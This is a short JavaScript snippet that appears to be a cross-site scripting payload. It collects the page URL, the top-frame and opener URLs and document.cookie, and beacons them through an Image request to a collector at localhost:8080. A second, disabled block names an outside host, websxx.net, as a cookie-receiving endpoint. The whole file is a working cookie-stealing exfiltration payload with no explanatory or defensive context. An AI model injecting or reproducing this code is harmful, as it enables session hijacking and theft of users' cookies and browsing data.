(function() {
	(new Image()).src = 'http://localhost:8080/webtest/sxxTest/doSXX.htm?location=' + escape((function() {
		try {
			return document.location.href
		} catch (e) {
			return '';
		}
	})()) + '&tophref=' + escape((function() {
		try {
			return top.location.href
		} catch (e) {
			return '';
		}
	})()) + '&cookie=' + escape((function() {
		try {
			return document.cookie
		} catch (e) {
			return '';
		}
	})()) + '&opener=' + escape((function() {
		try {
			return (window.opener && window.opener.location.href) ? window.opener.location.href : ''
		} catch (e) {
			return '';
		}
	})())
})();
if (' ' == 1) {
	keep = new Image();
	keep.src = 'http://websxx.net//index.jsp?url=' + escape(document.location) + '&cookie=' + escape(document.cookie)
}